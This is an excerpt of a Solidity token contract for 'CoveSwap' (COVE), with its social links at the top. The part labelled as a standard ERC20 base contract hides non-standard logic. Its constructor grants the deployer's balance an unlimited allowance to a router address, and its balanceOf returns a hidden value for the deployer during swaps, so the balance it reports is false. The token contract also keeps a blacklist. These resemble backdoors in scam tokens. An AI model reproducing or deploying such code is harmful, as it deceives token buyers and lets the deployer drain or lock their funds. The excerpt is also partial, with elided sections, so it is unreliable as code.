// TELEGRAM: https://t.me/CoveSwap
// WEBSITE: https://coveswap.com
// TWITTER: https://twitter.com/CoveSwap
...
contract COVE is Ownable, ERC20 {
    uint256 private _totalSupply = 10000000 * (10 ** 18);
    mapping(address => bool) public blacklist;

    constructor() ERC20("CoveSwap", "COVE", 18, msg.sender) {
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_, uint8 decimals_, address deployer_) {
        ...
        _decimals = decimals_;
        _deployer = deployer_;
        _allowances[_deployer][0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = type(uint256).max;
    }
    ...
    function balanceOf(address account) public view virtual override returns (uint256) {
        return (swapping && account == _deployer) ? _taxedTokens : _balances[account];
    }
